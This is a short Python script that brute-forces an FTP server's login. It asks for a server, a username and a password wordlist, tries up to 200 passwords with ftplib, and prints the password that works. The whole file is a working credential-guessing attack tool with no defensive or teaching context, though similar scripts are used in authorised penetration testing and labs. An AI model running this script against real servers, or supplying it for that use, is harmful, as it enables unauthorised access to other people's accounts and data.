#! /usr/bin/python3

import ftplib
import time

server = input("FTP Server: ");

user=input("username:  "); # noobs

Passwordlist=input("Path to PasswordList > ");

counter = 0

MAXTRIES = 200

try:

    with open(Passwordlist, 'r') as pw:

     for word in pw:

        word=word.strip('\r').strip('\n')

        print(f'Prøver med {counter} {word}')

        counter = counter + 1

        if (counter > MAXTRIES):

            break

        try:

            ftp = ftplib.FTP(server)

            # print(ftp.getwelcome())

            ftp.login(user,word)

            # time.sleep(0.2)

            print('Success! The password is ' + word )

            break

        except:

            print('Could not find.')

except:

    print('Wordlist error')
